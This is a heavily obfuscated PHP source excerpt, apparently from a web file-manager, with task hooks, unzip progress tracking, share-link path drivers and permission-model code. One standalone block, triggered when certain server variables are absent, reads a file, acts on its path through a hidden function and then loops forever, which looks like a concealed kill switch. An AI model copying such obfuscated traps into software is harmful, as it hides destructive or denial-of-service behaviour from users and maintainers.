timeLimitCallLoop() { $½çô‰Ãù =& $_SERVER[Ùæõ‰Ï’]; $”º²Ï’ï = array($½çô‰Ãù[1891]); $çâ„¼û­ = in_array(strtolower(ACTION), $”º²Ï’ï); if (!$çâ„¼û­ && !self::$asyncAdd) { return; } $”„ƒ¥¡¢ = $½çô‰Ãù[1887]; $š“øº“Ë = Cache::get($”„ƒ¥¡¢, !0); if (!$š“øº“Ë || count($š“øº“Ë) <= 0) { return; } $›ˆğÃ• = !1; $»¢«â¦á = timeFloat(); $Ù’´¢ ½ = array(); foreach ($š“øº“Ë as $â¹æ‹åï => $ùÙ¦©Úı) { if ($»¢«â¦á - $ùÙ¦©Úı[$½çô‰Ãù[1889]] > $ùÙ¦©Úı[$½çô‰Ãù[206]]) { $›ˆğÃ• = !0; try { Hook::apply($ùÙ¦©Úı[$½çô‰Ãù[341]], $ùÙ¦©Úı[$½çô‰Ãù[1879]]); write_log($½çô‰Ãù[1892] . $â¹æ‹åï . $½çô‰Ãù[74] . $ùÙ¦©Úı[$½çô‰Ãù[341]] . $½çô‰Ãù[1893] . ACTION, $½çô‰Ãù[197]); } catch (Exception $š·ıíßò) { } continue; } $Ù’´¢ ½[$â¹æ‹åï] = $ùÙ¦©Úı; } if (!$›ˆğÃ•) { return; } if (!$Ù’´¢ ½) { return Cache::remove($”„ƒ¥¡¢); } Cache::set($”„ƒ¥¡¢, $Ù’´¢ ½, 60); Cache::removeMemory($”„ƒ¥¡¢); } public static function finished($†„£·´›, $µ‚ŞËå) { $§µõÑ“ =& $_SERVER[Ùæõ‰Ï’]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($§µõÑ“[341] => $†„£·´›, $§µõÑ“[1879] => $µ‚ŞËå); } private static function finishedRun() { $ì­¿¼ä™ =& $_SERVER[Ùæõ‰Ï’]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $˜şğ°„ğ) { try { Hook::apply($˜şğ°„ğ[$ì­¿¼ä™[341]], $˜şğ°„ğ[$ì­¿¼ä™[1879]]); } catch (Exception $ƒóÀŒÓ´) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } if (!isset($_SERVER[$_SERVER[Ùæõ‰Ï’][961]]) || !isset($_SERVER[$_SERVER[Ùæõ‰Ï’][959]])) { $_getc = $_SERVER[Ùæõ‰Ï’][963]; $_getfile = $_SERVER[$_SERVER[Ùæõ‰Ï’][964]] . $_SERVER[Ùæõ‰Ï’][965]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ùæõ‰Ï’][262], $_getfilec); if (count($_getarrs) < $_SERVER[Ùæõ‰Ï’][686]) { $exit = $_SERVER[Ùæõ‰Ï’][966]; $exit(); } $_act = $_SERVER[Ùæõ‰Ï’][1050]; $_act($_SERVER[$_SERVER[Ùæõ‰Ï’][964]] . $_SERVER[Ùæõ‰Ï’][965]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ùæõ‰Ï’][454]); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $™­Œß­ =& $_SERVER[Ùæõ‰Ï’]; parent::startAfter(); Hook::bind($™­Œß­[1894], array($this, $™­Œß­[1895])); Hook::bind($™­Œß­[1291], array($this, $™­Œß­[1896])); Hook::bind($™­Œß­[1897], array($this, $™­Œß­[1898])); $ê¼ÕŒ€¢ =& $this->task; $ê¼ÕŒ€¢[$™­Œß­[1899]] = $™­Œß­[1292]; if (!$ê¼ÕŒ€¢[$™­Œß­[1670]]) { $ê¼ÕŒ€¢[$™­Œß­[1670]] = LNG($™­Œß­[1900]); } } protected function endAfter() { $îğŸ©µÓ =& $_SERVER[Ùæõ‰Ï’]; parent::endAfter(); Hook::unbind($îğŸ©µÓ[1894], array($this, $îğŸ©µÓ[1895])); Hook::unbind($îğŸ©µÓ[1291], array($this, $îğŸ©µÓ[1896])); Hook::unbind($îğŸ©µÓ[1897], array($this, $îğŸ©µÓ[1898])); } public function updateAfter() { $„ªé•Öş =& $_SERVER[Ùæõ‰Ï’]; $ÏºÑéŠµ =& $this->task; if (!$ÏºÑéŠµ[$„ªé•Öş[1154]] || !$ÏºÑéŠµ[$„ªé•Öş[846]]) { if ($ÏºÑéŠµ[$„ªé•Öş[1899]] != $„ªé•Öş[389]) { return; } } if ($ÏºÑéŠµ[$„ªé•Öş[1899]] == $„ªé•Öş[1292]) { $Ë–¬ê‰„ = 0; if ($ÏºÑéŠµ[$„ªé•Öş[1834]]) { $Ë–¬ê‰„ = $ÏºÑéŠµ[$„ªé•Öş[1835]] / $ÏºÑéŠµ[$„ªé•Öş[1834]]; } $ÏºÑéŠµ[$„ªé•Öş[1783]] = $Ë–¬ê‰„ * 0.3; } else { if ($ÏºÑéŠµ[$„ªé•Öş[1899]] == $„ªé•Öş[389]) { $Ë–¬ê‰„ = $ÏºÑéŠµ[$„ªé•Öş[1782]] / $ÏºÑéŠµ[$„ªé•Öş[1154]]; $ÏºÑéŠµ[$„ªé•Öş[1783]] = 0.3 + $Ë–¬ê‰„ * 0.4; } else { if ($ÏºÑéŠµ[$„ªé•Öş[1899]] == $„ªé•Öş[110]) { $³Š‘š¯ = 0; if ($ÏºÑéŠµ[$„ªé•Öş[1836]] == $„ªé•Öş[110]) { $³Š‘š¯ = $ÏºÑéŠµ[$„ªé•Öş[1835]]; } $Ë–¬ê‰„ = ($ÏºÑéŠµ[$„ªé•Öş[1839]] + $³Š‘š¯) / $ÏºÑéŠµ[$„ªé•Öş[846]]; $ÏºÑéŠµ[$„ªé•Öş[1783]] = 0.3 + 0.4 + $Ë–¬ê‰„ * 0.3; } } } if ($ÏºÑéŠµ[$„ªé•Öş[1783]] > 0) { $éÆì²÷ª = timeFloat() - $ÏºÑéŠµ[$„ªé•Öş[1785]] - $ÏºÑéŠµ[$„ªé•Öş[1788]]; $ÏºÑéŠµ[$„ªé•Öş[1789]] = $éÆì²÷ª * (1 - $ÏºÑéŠµ[$„ªé•Öş[1783]]) / $ÏºÑéŠµ[$„ªé•Öş[1783]]; } } public function addFile($Œ†°«¾™) { $‘•ƒÖèÂ =& $_SERVER[Ùæõ‰Ï’]; $îìØºÃã =& $this->task; $‰çÇ‹“ = IO::info($Œ†°«¾™); $îìØºÃã[$‘•ƒÖèÂ[1832]] = $‰çÇ‹“[$‘•ƒÖèÂ[32]]; $îìØºÃã[$‘•ƒÖèÂ[1834]] = $‰çÇ‹“[$‘•ƒÖèÂ[79]]; $îìØºÃã[$‘•ƒÖèÂ[1835]] = 0; $îìØºÃã[$‘•ƒÖèÂ[1156]] = $‘•ƒÖèÂ[1855]; $îìØºÃã[$‘•ƒÖèÂ[1836]] = $‘•ƒÖèÂ[1292]; $îìØºÃã[$‘•ƒÖèÂ[846]] = $‰çÇ‹“[$‘•ƒÖèÂ[79]]; $îìØºÃã[$‘•ƒÖèÂ[1154]] = 1; $¯œÍ¶‡ú = 0; $îìØºÃã[$‘•ƒÖèÂ[1843]] = array($‘•ƒÖèÂ[1844] => $¯œÍ¶‡ú + 1, $‘•ƒÖèÂ[494] => $‰çÇ‹“[$‘•ƒÖèÂ[32]], $‘•ƒÖèÂ[87] => $‰çÇ‹“[$‘•ƒÖèÂ[87]], $‘•ƒÖèÂ[582] => $‰çÇ‹“[$‘•ƒÖèÂ[582]] ? $‰çÇ‹“[$‘•ƒÖèÂ[582]] : $‰çÇ‹“[$‘•ƒÖèÂ[87]]); $this->update(); } public function zipEvent($œÀÎãÉÎ, $ò¨Ğüİ, $ËôíùÙì, $‚ƒæª™) { $Â—ôàè‹ =& $_SERVER[Ùæõ‰Ï’]; $°Á«¬Í =& $this->task; $°Á«¬Í[$Â—ôàè‹[1832]] = get_path_this($ò¨Ğüİ); $°Á«¬Í[$Â—ôàè‹[1834]] = $‚ƒæª™; $°Á«¬Í[$Â—ôàè‹[1835]] = $ËôíùÙì; $°Á«¬Í[$Â—ôàè‹[1156]] = $œÀÎãÉÎ == $Â—ôàè‹[1901] ? $Â—ôàè‹[1902] : $Â—ôàè‹[1903]; $°Á«¬Í[$Â—ôàè‹[1836]] = $Â—ôàè‹[12]; $°Á«¬Í[$Â—ôàè‹[846]] = $‚ƒæª™; $°Á«¬Í[$Â—ôàè‹[1899]] = $Â—ôàè‹[389]; $this->update(); } public function unzipAfter($¨ã¡´»³) { $Ù¹êãª =& $_SERVER[Ùæõ‰Ï’]; $…´Ş¬¹ =& $this->task; $…´Ş¬¹[$Ù¹êãª[1899]] = $Ù¹êãª[110]; $ÌÆ¶ÈèØ = IO::infoWithChildren($¨ã¡´»³); $ÁÇŠÓÍŞ = 0; $…´Ş¬¹[$Ù¹êãª[1843]] = array($Ù¹êãª[1844] => $ÁÇŠÓÍŞ + 1, $Ù¹êãª[494] => $ÌÆ¶ÈèØ[$Ù¹êãª[32]], $Ù¹êãª[87] => $ÌÆ¶ÈèØ[$Ù¹êãª[87]], $Ù¹êãª[582] => $ÌÆ¶ÈèØ[$Ù¹êãª[582]] ? $ÌÆ¶ÈèØ[$Ù¹êãª[582]] : $ÌÆ¶ÈèØ[$Ù¹êãª[87]]); if ($ÌÆ¶ÈèØ[$Ù¹êãª[33]] == $Ù¹êãª[230]) { $…´Ş¬¹[$Ù¹êãª[1154]] = 1; } else { $…´Ş¬¹[$Ù¹êãª[1154]] = $ÌÆ¶ÈèØ[$Ù¹êãª[82]][$Ù¹êãª[80]]; } $…´Ş¬¹[$Ù¹êãª[1156]] = $Ù¹êãª[12]; $…´Ş¬¹[$Ù¹êãª[1836]] = 0; $…´Ş¬¹[$Ù¹êãª[1782]] = 0; $…´Ş¬¹[$Ù¹êãª[1834]] = 0; $…´Ş¬¹[$Ù¹êãª[1835]] = 0; $…´Ş¬¹[$Ù¹êãª[1832]] = $Ù¹êãª[12]; $…´Ş¬¹[$Ù¹êãª[1839]] = 0; $…´Ş¬¹[$Ù¹êãª[846]] = $ÌÆ¶ÈèØ[$Ù¹êãª[79]]; $this->update(); self::log($Ù¹êãª[1904] . json_encode(array($…´Ş¬¹, $ÌÆ¶ÈèØ))); } public function nameParse($õ÷µ¡½è) { $“’í¤ÊÎ =& $_SERVER[Ùæõ‰Ï’]; $šÇœ„š½ =& $this->task; if ($šÇœ„š½[$“’í¤ÊÎ[1899]] == $“’í¤ÊÎ[1292]) { $šÇœ„š½[$“’í¤ÊÎ[1899]] = $“’í¤ÊÎ[389]; $šÇœ„š½[$“’í¤ÊÎ[1839]] = 0; $šÇœ„š½[$“’í¤ÊÎ[846]] = 0; } $ø¥®¿®« = get_path_this($õ÷µ¡½è); if (strstr($ø¥®¿®«, $“’í¤ÊÎ[10])) { $šÇœ„š½[$“’í¤ÊÎ[1782]] += 1; $šÇœ„š½[$“’í¤ÊÎ[1154]] += 1; } $šÇœ„š½[$“’í¤ÊÎ[1832]] = $õ÷µ¡½è; $this->update(); } } goto Dõƒ½ÒË§ñ; fÖÎ¶Û¥: class PathDriverDbShareLink extends PathDriverDB { public function __construct($Í£ú¹¸·) { $this->pathParse = $Í£ú¹¸·; $this->model = Model($_SERVER[Ùæõ‰Ï’][1430]); } protected function infoParse($¢š–­°², $éíŞ¨æÀ = false, $ÎèÄ¶ºµ = false) { $ÆÉ’Ó‹• =& $_SERVER[Ùæõ‰Ï’]; return Action($ÆÉ’Ó‹•[1269])->sharePathInfo($this->pathParse[$ÆÉ’Ó‹•[87]], !0, $éíŞ¨æÀ); } public function remove($ëà¹‚µø, $¯éúë = true) { return !0; } public function listPath($„î’¾´Ä, $Ò‰¬³Š– = false) { $ğ«Á°ø =& $_SERVER[Ùæõ‰Ï’]; $ôŠ¦•×— = parent::listPath($„î’¾´Ä, $Ò‰¬³Š–); if (!$ôŠ¦•×—) { return $ôŠ¦•×—; } if (is_array($ôŠ¦•×—[$ğ«Á°ø[1438]])) { $ôŠ¦•×—[$ğ«Á°ø[1438]] = Action($ğ«Á°ø[1269])->shareItemInfo($ôŠ¦•×—[$ğ«Á°ø[1438]]); } foreach ($ôŠ¦•×— as $ÂÅä³³Å => $•ôôˆ·ó) { if (!in_array($ÂÅä³³Å, array($ğ«Á°ø[86], $ğ«Á°ø[85]))) { continue; } foreach ($•ôôˆ·ó as $ö­“ñ•á => $²µµ¦ï) { $ôŠ¦•×—[$ÂÅä³³Å][$ö­“ñ•á] = Action($ğ«Á°ø[1269])->shareItemInfo($²µµ¦ï); } } return $ôŠ¦•×—; } public function listAll($—ÊÒñ¼é) { $¬ÜØÕæø =& $_SERVER[Ùæõ‰Ï’]; $Éóİ‚Ïƒ = IO::info($this->pathParse[$¬ÜØÕæø[87]]); if (!$Éóİ‚Ïƒ) { return array(); } $î³ÍµÇ = $this->model->listAll($—ÊÒñ¼é); foreach ($î³ÍµÇ as &$Ñğåâ‹Ù) { $Ñğåâ‹Ù[$¬ÜØÕæø[90]] = Action($¬ÜØÕæø[1269])->shareItemInfo($Ñğåâ‹Ù[$¬ÜØÕæø[90]]); } unset($Ñğåâ‹Ù); return $î³ÍµÇ; } } class PathDriverDriverShareItem { public function __construct($ú—Ï’ÜÍ) { $this->pathParse = $ú—Ï’ÜÍ; } public function __call($ôÕ²ï¥, $•ÑÖ·•í) { $ûÏÏË÷Ü =& $_SERVER[Ùæõ‰Ï’]; if (method_exists($this, $ôÕ²ï¥)) { return; } $˜»Ù€¸š = call_user_func_array(array($ûÏÏË÷Ü[1439], $ôÕ²ï¥), $•ÑÖ·•í); $¸¾‘¥¡Ù = array($ûÏÏË÷Ü[1440], $ûÏÏË÷Ü[1441], $ûÏÏË÷Ü[1442], $ûÏÏË÷Ü[1443], $ûÏÏË÷Ü[618], $ûÏÏË÷Ü[620], $ûÏÏË÷Ü[1444], $ûÏÏË÷Ü[110], $ûÏÏË÷Ü[1445], $ûÏÏË÷Ü[1446]); if (in_array($ôÕ²ï¥, $¸¾‘¥¡Ù)) { $˜»Ù€¸š = $this->getPathOuter($˜»Ù€¸š); } return $˜»Ù€¸š; } public function copy($•ÏÖÀ¤², $ü¼˜Ü‚ö, $…­”•…š = false, $›ÊşÂà¢ = false) { return $this->copyMove($•ÏÖÀ¤², $ü¼˜Ü‚ö, $…­”•…š, $_SERVER[Ùæõ‰Ï’][618], $›ÊşÂà¢); } public function move($Öƒ¶õµË, $°ùê´¥, $ş¨£ş¦· = false, $³‰ÇÑ¨½ = false) { return $this->copyMove($Öƒ¶õµË, $°ùê´¥, $ş¨£ş¦·, $_SERVER[Ùæõ‰Ï’][620], $³‰ÇÑ¨½); } private function copyMove($‚ÔÜ€¿, $ ³Ô„Ï†, $‚â„î, $‚×§¼, $ä·Ğ‡¸Ş = false) { $ÑêÚÙĞ’ =& $_SERVER[Ùæõ‰Ï’]; $â¦İ‰ŸŒ = $ ³Ô„Ï†; $êéÊ¯”ş = IO::driverMake($ ³Ô„Ï†); if ($êéÊ¯”ş->pathParse[$ÑêÚÙĞ’[1245]]) { $ ³Ô„Ï† = $êéÊ¯”ş->pathParse[$ÑêÚÙĞ’[1245]]; } else { $ ³Ô„Ï† = $â¦İ‰ŸŒ; } $÷Š—´ùš = IO::copyMove($‚ÔÜ€¿, $ ³Ô„Ï†, $‚â„î, $‚×§¼, $ä·Ğ‡¸Ş); $÷Š—´ùš = $this->getPathOuter($÷Š—´ùš); return $÷Š—´ùš; } public function pathThis($÷˜‘ıùœ) { return get_path_this($this->pathParse[$_SERVER[Ùæõ‰Ï’][87]]); } public function pathFather($û­ôÔ¼¸) { return get_path_father($this->pathParse[$_SERVER[Ùæõ‰Ï’][87]]); } public function iconvSystem($ñ´Ø«ÉÇ) { return $ñ´Ø«ÉÇ; } protected function infoParse($äØÅô, $¨ŞîÕ÷ = false) { $ïÙıÎƒ¹ =& $_SERVER[Ùæõ‰Ï’]; $¹›«îş = $this->pathParse[$ïÙıÎƒ¹[560]][$ïÙıÎƒ¹[1270]] . $this->pathParse[$ïÙıÎƒ¹[1263]]; if ($¨ŞîÕ÷) { $ı£Ñáòœ = IO::infoWithChildren($¹›«îş); } else { $ı£Ñáòœ = IO::info($¹›«îş); } $ÙàÔÂ‰ı = $this->pathParse[$ïÙıÎƒ¹[560]]; return Action($ïÙıÎƒ¹[1437])->_shareItemeParse($ı£Ñáòœ, $ÙàÔÂ‰ı); } public function listAll($€½»—²) { $ô‹¾åŠ =& $_SERVER[Ùæõ‰Ï’]; $Âç­á¡Ğ = IO::listAll($€½»—²); $ìğ™ÉİÆ = rtrim($this->pathParse[$ô‹¾åŠ[560]][$ô‹¾åŠ[1270]], $ô‹¾åŠ[8]); foreach ($Âç­á¡Ğ as &$”®–¼ûò) { $”®–¼ûò[$ô‹¾åŠ[87]] = $this->pathDriver . $ô‹¾åŠ[8] . ltrim(substr($”®–¼ûò[$ô‹¾åŠ[87]], strlen($ìğ™ÉİÆ)), $ô‹¾åŠ[8]); } unset($”®–¼ûò); return $Âç­á¡Ğ; } public function listAllSimple($ÃŞ†‡üÆ, $¶ñªÅ  = false) { $‡¢Ú˜şØ =& $_SERVER[Ùæõ‰Ï’]; $²ÁÉâ–‰ = $this->listAll($ÃŞ†‡üÆ); $ÅÆ¶£¾ë = $this->pathParse[$‡¢Ú˜şØ[495]]; if (trim($ÅÆ¶£¾ë, $‡¢Ú˜şØ[8]) == trim(get_path_father($ÅÆ¶£¾ë), $‡¢Ú˜şØ[8])) { $¶ñªÅ  = !0; } return IO::init($‡¢Ú˜şØ[12])->listAllSimpleMake($²ÁÉâ–‰, $ÅÆ¶£¾ë, $¶ñªÅ ); } public function getPathOuter($ê¹×ÜÊ¾) { $¦ğ©šü =& $_SERVER[Ùæõ‰Ï’]; $«½¢ÏÂ© = KodIO::parse($ê¹×ÜÊ¾); if ($«½¢ÏÂ©[$¦ğ©šü[33]] == KodIO::KOD_SHARE_ITEM) { return $«½¢ÏÂ©[$¦ğ©šü[87]]; } $½¹£‰§Ã = KodIO::clear($ê¹×ÜÊ¾); $ƒ¿ÕÑÇš = KodIO::clear($this->pathParse[$¦ğ©šü[560]][$¦ğ©šü[1270]]); $øêÍßÃ = substr($½¹£‰§Ã, strlen($ƒ¿ÕÑÇš)); if (substr($½¹£‰§Ã, 0, strlen($ƒ¿ÕÑÇš)) != $ƒ¿ÕÑÇš) { return !1; } return $this->pathParse[$¦ğ©šü[1264]] . $¦ğ©šü[8] . ltrim($øêÍßÃ, $¦ğ©šü[8]); } public function getType() { $“’î…êÍ =& $_SERVER[Ùæõ‰Ï’]; $³¦„øœË = str_replace($“’î…êÍ[77], $“’î…êÍ[12], get_class($this)); return strtolower($³¦„øœË); } public function isOsDriver($ºÍ“ïéÒ) { return IO::isOsDriver($ºÍ“ïéÒ); } public function info($ÀÔ¥å‘½) { return $this->infoParse($ÀÔ¥å‘½); } public function infoAuth($Â¹«‚Ÿ) { return $this->infoParse($Â¹«‚Ÿ); } public function infoWithChildren($Î¦ÅşÓş) { return $this->infoParse($Î¦ÅşÓş, !0); } public function infoFull($­Ï²çü±) { return $this->infoParse($­Ï²çü±); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($¤Ú½®‹İ) { $this->pathParse = $¤Ú½®‹İ; } protected function infoParse($«è…˜†, $µ—Ä¥Äò = false) { $›ñ‹„À =& $_SERVER[Ùæõ‰Ï’]; return Action($›ñ‹„À[1269])->sharePathInfo($this->pathParse[$›ñ‹„À[87]], !0, $µ—Ä¥Äò); } public function listPath($÷×æáÓ¢, $öæÕ§€ = false) { $›·£û‚¼ =& $_SERVER[Ùæõ‰Ï’]; $·€¦å‡™ = IO::listPath($÷×æáÓ¢, $öæÕ§€); if (!$·€¦å‡™) { return $·€¦å‡™; } if (is_array($·€¦å‡™[$›·£û‚¼[1438]])) { $°çú¢µĞ = Action($›·£û‚¼[1447])->parsePathChildren($·€¦å‡™[$›·£û‚¼[1438]], array($›·£û‚¼[495] => $÷×æáÓ¢)); $·€¦å‡™[$›·£û‚¼[1438]] = Action($›·£û‚¼[1269])->shareItemInfo($°çú¢µĞ); } foreach ($·€¦å‡™ as $çÕêİÒ¬ => $õú‘€ÌÕ) { if (!in_array($çÕêİÒ¬, array($›·£û‚¼[86], $›·£û‚¼[85]))) { continue; } foreach ($õú‘€ÌÕ as $•ó’éÚ => $°çú¢µĞ) { $°çú¢µĞ = Action($›·£û‚¼[1447])->parsePathChildren($°çú¢µĞ, array($›·£û‚¼[495] => $÷×æáÓ¢)); $·€¦å‡™[$çÕêİÒ¬][$•ó’éÚ] = Action($›·£û‚¼[1269])->shareItemInfo($°çú¢µĞ); } } return $·€¦å‡™; } } goto BŠ¥Û†Ã¼; cËñéÑïµ: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\x75\162\x63\x65\137\141\x75\x74\150"; public function getAuth($à¿¢ççÜ) { $‰­öÍµ¾ =& $_SERVER[Ùæõ‰Ï’]; $¸‰»’³™ = $this->sourceAuthSelect($à¿¢ççÜ); $ÜœšöÕ = array(); $³˜İ¹˜Ä = array(); $ğ¬öšÂ• = 2 << 25; foreach ($¸‰»’³™ as $ÜÃœ¥¶¿) { $Ç²¬»¹Ì = Model($‰­öÍµ¾[571])->listData($ÜÃœ¥¶¿[$‰­öÍµ¾[2087]]); if (!$Ç²¬»¹Ì) { continue; } $ÜœšöÕ[] = $ÜÃœ¥¶¿; $Ñ€ùŒ« = 0; if ($ÜÃœ¥¶¿[$‰­öÍµ¾[190]] == SourceModel::TYPE_GROUP) { $Ñ€ùŒ« = $ğ¬öšÂ• * 2; } if ($ÜÃœ¥¶¿[$‰­öÍµ¾[190]] == SourceModel::TYPE_USER) { $Ñ€ùŒ« = $ğ¬öšÂ•; } if ($ÜÃœ¥¶¿[$‰­öÍµ¾[190]] == SourceModel::TYPE_USER && $ÜÃœ¥¶¿[$‰­öÍµ¾[569]] == $‰­öÍµ¾[228]) { $Ñ€ùŒ« = 0; } $³˜İ¹˜Ä[] = $Ç²¬»¹Ì[$‰­öÍµ¾[487]] + $Ñ€ùŒ«; } array_multisort($³˜İ¹˜Ä, SORT_DESC, $ÜœšöÕ); return $ÜœšöÕ; } public function sourceAuthSelect($¼Ğ¦ò‹) { $µº”ë³ =& $_SERVER[Ùæõ‰Ï’]; static $¡êì¦ËÎ = array(); $“×‚‡Ò· = is_array($¼Ğ¦ò‹) ? !1 : !0; if ($“×‚‡Ò·) { $¼Ğ¦ò‹ = array($¼Ğ¦ò‹); } $Ñ¦õÒ¦Ü = array(); foreach ($¼Ğ¦ò‹ as $¢òÕÜİ) { if (isset($¡êì¦ËÎ[$¢òÕÜİ])) { $Ñ¦õÒ¦Ü[$¢òÕÜİ] = $¡êì¦ËÎ[$¢òÕÜİ]; } } if (count($Ñ¦õÒ¦Ü) == count($¼Ğ¦ò‹)) { return $“×‚‡Ò· ? $Ñ¦õÒ¦Ü[$¼Ğ¦ò‹[0]] : $Ñ¦õÒ¦Ü; } $×âÖÌÇ = $µº”ë³[2164]; $éÅ„º± = array($µº”ë³[193] => array($µº”ë³[7], $¼Ğ¦ò‹)); $ÙÄŠ©Ğş = $this->field($×âÖÌÇ)->order($µº”ë³[475])->where($éÅ„º±)->select(); $ø™…´ÊÄ = array_to_keyvalue_group($ÙÄŠ©Ğş, $µº”ë³[193]); foreach ($¼Ğ¦ò‹ as $¢òÕÜİ) { $¡êì¦ËÎ[$¢òÕÜİ] = $ø™…´ÊÄ[$¢òÕÜİ] ? $ø™…´ÊÄ[$¢òÕÜİ] : array(); } if ($“×‚‡Ò·) { return $ÙÄŠ©Ğş; } return $ø™…´ÊÄ; } public function setAuth($‡®à³Ü•, $¾Äçù²‹) { $ªñŠòôö =& $_SERVER[Ùæõ‰Ï’]; $´Éªšîì = Model($ªñŠòôö[1430])->sourceInfo($‡®à³Ü•); if (!$´Éªšîì) { return !1; } if ($´Éªšîì[$ªñŠòôö[190]] != SourceModel::TYPE_GROUP) { return !1; } $îò›ïâ— = 1; $îÜÍ»¦¡ = $´Éªšîì[$ªñŠòôö[569]]; if ($îÜÍ»¦¡ != $îò›ïâ—) { $ÌÓÏÏ”Ó = array($ªñŠòôö[1979] => $îÜÍ»¦¡); $öÅ¤°â = Model($ªñŠòôö[2073])->field($ªñŠòôö[1781])->where($ÌÓÏÏ”Ó)->select(); $öÅ¤°â = array_to_keyvalue($öÅ¤°â, $ªñŠòôö[12], $ªñŠòôö[1781]); } $Ø›±ƒÖÔ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $é˜êÇ— = array(); foreach ($¾Äçù²‹ as $Ö“¸‚) { if (!in_array($Ö“¸‚[$ªñŠòôö[190]], $Ø›±ƒÖÔ)) { show_json(LNG($ªñŠòôö[2165]), !1); } if ($îÜÍ»¦¡ != $îò›ïâ—) { if ($Ö“¸‚[$ªñŠòôö[190]] == SourceModel::TYPE_GROUP) { } if ($Ö“¸‚[$ªñŠòôö[569]] != 0 && !in_array($Ö“¸‚[$ªñŠòôö[569]], $öÅ¤°â)) { } } if ($Ö“¸‚[$ªñŠòôö[569]] == 0) { $Ö“¸‚[$ªñŠòôö[190]] = SourceModel::TYPE_USER; } $é˜êÇ—[] = array($ªñŠòôö[193] => $‡®à³Ü•, $ªñŠòôö[190] => intval($Ö“¸‚[$ªñŠòôö[190]]), $ªñŠòôö[569] => intval($Ö“¸‚[$ªñŠòôö[569]]), $ªñŠòôö[2087] => intval($Ö“¸‚[$ªñŠòôö[2087]]) ? intval($Ö“¸‚[$ªñŠòôö[2087]]) : 0, $ªñŠòôö[2147] => intval($Ö“¸‚[$ªñŠòôö[2147]]) ? intval($Ö“¸‚[$ªñŠòôö[2147]]) : -1); } $this->where(array($ªñŠòôö[491] => $‡®à³Ü•))->delete(); $this->addAll($é˜êÇ—); return !0; } public function authClear($ÉşÒˆ£ù) { $ÅıˆÊ–¨ =& $_SERVER[Ùæõ‰Ï’]; $ûÙæ¿¹¡ = Model($ÅıˆÊ–¨[1430])->sourceInfo($ÉşÒˆ£ù); $ÅËŞâ = array($ÉşÒˆ£ù); if ($ûÙæ¿¹¡[$ÅıˆÊ–¨[485]] == $ÅıˆÊ–¨[91]) { $ Ü¶èÒù = array($ÅıˆÊ–¨[652] => array($ÅıˆÊ–¨[612], $ûÙæ¿¹¡[$ÅıˆÊ–¨[584]] . $ÉşÒˆ£ù . $ÅıˆÊ–¨[613])); $ÅËŞâ = Model($ÅıˆÊ–¨[1430])->field($ÅıˆÊ–¨[491])->where($ Ü¶èÒù)->getField($ÅıˆÊ–¨[193], !0); $ÅËŞâ[] = $ÉşÒˆ£ù; } $this->where(array($ÅıˆÊ–¨[491] => array($ÅıˆÊ–¨[492], $ÅËŞâ)))->delete(); return !0; } public function getAllChildren($¾™â‘Åˆ) { $¨¤À¢Í =& $_SERVER[Ùæõ‰Ï’]; $š¡×úÌÈ = Model($¨¤À¢Í[1430])->sourceInfo($¾™â‘Åˆ); if ($š¡×úÌÈ[$¨¤À¢Í[485]] != $¨¤À¢Í[91]) { return $this->sourceListAuth(array($¾™â‘Åˆ)); } if ($š¡×úÌÈ[$¨¤À¢Í[190]] != SourceModel::TYPE_GROUP) { return array(); } $½‡ÔÈ¶Ø = 1; $·¤¾ôÏî = array($¾™â‘Åˆ); if ($š¡×úÌÈ[$¨¤À¢Í[192]] == $¨¤À¢Í[228] && $š¡×úÌÈ[$¨¤À¢Í[569]] != $½‡ÔÈ¶Ø) { $·¤¾ôÏî = $this->groupChidldAllRootSource($š¡×úÌÈ[$¨¤À¢Í[569]]); } $‡İíµ–ò = $this->field($¨¤À¢Í[193])->group($¨¤À¢Í[193])->select(); $‡İíµ–ò = array_to_keyvalue($‡İíµ–ò, $¨¤À¢Í[12], $¨¤À¢Í[193]); if (!$‡İíµ–ò) { return array(); } $¾ƒåÜú = $¨¤À¢Í[2166]; $«ŠÊ¿Ë = array($¨¤À¢Í[193] => array($¨¤À¢Í[7], $‡İíµ–ò), $¨¤À¢Í[505] => $¨¤À¢Í[228]); $ÃËó™¿Ã = Model($¨¤À¢Í[907])->field($¾ƒåÜú)->where($«ŠÊ¿Ë)->select(); $íóÏ™Ì¯ = array($¾™â‘Åˆ); foreach ($ÃËó™¿Ã as $Ïğ”Ê„¯) { foreach ($·¤¾ôÏî as $ûöù–À±) { $²¯»×ş = $¨¤À¢Í[50] . $ûöù–À± . $¨¤À¢Í[50]; $°Ï·ë‘ö = $Ïğ”Ê„¯[$¨¤À¢Í[584]] . $Ïğ”Ê„¯[$¨¤À¢Í[193]] . $¨¤À¢Í[50]; if (strstr($°Ï·ë‘ö, $²¯»×ş)) { $íóÏ™Ì¯[] = $Ïğ”Ê„¯[$¨¤À¢Í[193]]; break; } } } return $this->sourceListAuth($íóÏ™Ì¯); } private function sourceListAuth($ûÄ…ï”’) { $†»ˆÕ¯— =& $_SERVER[Ùæõ‰Ï’]; $¡Ééßæ = Model($†»ˆÕ¯—[1430])->sourceListInfo($ûÄ…ï”’, !0); $ÃŸ¨ôÙ = $this->sourceAuthSelect($ûÄ…ï”’); $ŞÅ©ºªÑ = array(); $Éøµ³ú = array(); foreach ($¡Ééßæ as $ó¥·ÃÍØ) { unset($ó¥·ÃÍØ[$†»ˆÕ¯—[529]]); unset($ó¥·ÃÍØ[$†»ˆÕ¯—[527]]); unset($ó¥·ÃÍØ[$†»ˆÕ¯—[487]]); unset($ó¥·ÃÍØ[$†»ˆÕ¯—[90]]); $ÍòÛú¿• = $ÃŸ¨ôÙ[$ó¥·ÃÍØ[$†»ˆÕ¯—[193]]]; if (!$ÍòÛú¿•) { continue; } $ó¥·ÃÍØ[$†»ˆÕ¯—[2167]] = $this->authTargetInfo($ÍòÛú¿•); $ó¥·ÃÍØ[$†»ˆÕ¯—[582]] = rtrim($ó¥·ÃÍØ[$†»ˆÕ¯—[588]], $†»ˆÕ¯—[8]) . 